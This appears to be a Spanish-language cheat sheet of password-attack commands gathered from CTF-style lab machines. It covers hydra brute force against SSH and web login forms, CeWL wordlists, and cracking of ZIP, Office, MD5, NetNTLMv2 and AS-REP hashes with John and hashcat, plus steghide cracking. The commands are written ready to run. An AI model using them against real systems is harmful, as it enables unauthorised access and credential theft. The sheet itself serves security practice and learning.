# Fuerza bruta y crackeo de hashes

Comandos usados en **CACHOPO**, **GOIKO**, **PapaFirta**, **Soporte**, **THE AVENGERS** y **PROXY**.

## 1. Fuerza bruta SSH con hydra

Con lista de usuarios y diccionario de contraseñas:

```
hydra -L usuarios.txt -P /usr/share/wordlists/rockyou.txt ssh://<IP>
```

Con un solo usuario y una sola contraseña (ataque dirigido):

```
hydra -L usuarios.txt -p abuelacalientalasopa ssh://<IP>
```

Con una sola contraseña y lista de usuarios (patrón descubierto en la web, por ejemplo `fuerzabrutaXXXX`):

```
hydra -l help@support.thm -P /usr/share/wordlists/rockyou.txt ssh://<IP>
```

- `-L` → archivo con usuarios (uno por línea).
- `-l` → un solo usuario.
- `-P` → archivo con contraseñas.
- `-p` → una sola contraseña.
- `-t 4` → número de hilos (bajarlo si el servidor corta conexiones).

## 2. Fuerza bruta de un formulario web

```
hydra -l <usuario> -P /usr/share/wordlists/rockyou.txt <IP> http-post-form "/:email=^USER^&password=^PASS^:F=Invalid credentials"
```

Estructura de `http-post-form`:

```
/<ruta>:<parametros>=^USER^&<param>=^PASS^:<cadena de fallo>
```

- `^USER^` y `^PASS^` → se sustituyen por cada intento.
- `F=Invalid credentials` → cadena que aparece cuando el login falla; si no la pones, hydra marca falsos positivos.

## 3. Diccionario de usuarios con CeWL

```
cewl -d 2 -m 7 --lowercase --with-numbers -w cewl_words.txt http://<dominio>:<puerto>
```

## 4. Crackeo de hashes con John the Ripper

**Archivos ZIP:**

```
zip2john documentos.zip > zip.hash
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
```

**Documento Office cifrado** (el hash se extrae con `office2john`):

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Hash suelto con formato indicado** (MD5, por ejemplo de una cookie):

```
john --format=raw-md5 hashes.txt
```

**Hash NetNTLMv2** (capturado con Responder, formato `<usuario>::<DOMINIO>:<challenge>:<hash>`):

```
hashcat -m 5600 netntlmv2.hash /usr/share/wordlists/rockyou.txt
john --format=netntlmv2 netntlmv2.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

- hashcat → modo **`5600`**; john → formato **`netntlmv2`**.
- La respuesta sale al final del hash: `...: contraseña_en_claro`.
- Antes de rockyou prueba candidatos baratos: contraseñas que ya tengas de otros ficheros o variantes del nombre del usuario (`Scann3r!`, `svc_scanner`...).

**Hash AS-REP** (de `GetNPUsers`, empieza por `$krb5asrep$`):

```
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
john --format=krb5asrep asrep.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

- hashcat → modo **`18200`**; john → formato **`krb5asrep`**.

**Ver la contraseña descubierta:**

```
john --show hash.txt
```

## 5. Recuperar la contraseña de John si la pierde

```
john --wordlist=/usr/share/wordlists/rockyou.txt --rules hash.txt
```

## 6. Esteganografía

Extraer un archivo oculto en una imagen (pide contraseña):

```
steghide extract -sf imagen.jpg
```

Crackear esa contraseña con `stegcracker`:

```
stegcracker imagen.jpg /usr/share/wordlists/rockyou.txt
```

## 7. Diccionarios del sistema

- Contraseñas: `/usr/share/wordlists/rockyou.txt`
- Usuarios: `/home/kali/SecLists/Usernames/xato-net-10-million-usernames-dup.txt`
